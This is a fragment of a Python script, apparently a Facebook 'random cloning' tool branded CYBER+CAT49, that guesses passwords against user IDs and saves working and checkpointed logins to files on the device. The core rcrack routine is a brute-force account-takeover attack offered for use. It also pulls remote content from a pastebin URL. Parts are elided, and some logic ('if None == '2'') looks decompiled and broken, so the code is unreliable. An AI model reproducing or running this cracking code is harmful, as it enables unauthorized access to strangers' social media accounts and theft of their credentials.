...
apk1=requests.get("https://pastebin.com/raw/zvrCUUR6").text
def lo(word):
...
def CYBER():
    ...
    _CYBER_("clear")
    print(logo)
    _ANKON_("espeak \"Hi sir ,Wellcome to CYBER+CAT49 Rendom cloneing tool\"")
    ...
    if opt == '1':
    	_CYBER_("espeak \" you choose random cloning\"")
    	xxr()
    if None == '2':
        _CYBER_('xdg-open https://www.facebook.com/profile.php?id=100085050505696')
        _CYBER_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _CYBER_('xdg-open https://github.com/ANKON-00')
        _CYBER_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _CYBER_('xdg-open https://www.facebook.com/profile.php?id=100085050505696')
        _CYBER_("espeak \"you choose messenger\"")
    if None == '0':
        _CYBER_('exit')
        _CYBER_("espeak \"good bye sir\"")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/CYBER_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
               ...
               # print('\r\r\33[1;30m [ERROR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                _ANKON_("espeak \"CYBER-49 is brand\"")
                open('/sdcard/CYBER_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['CYBER-CAT-00I','CYBER-CAT ','CAT-CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}CYBER\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
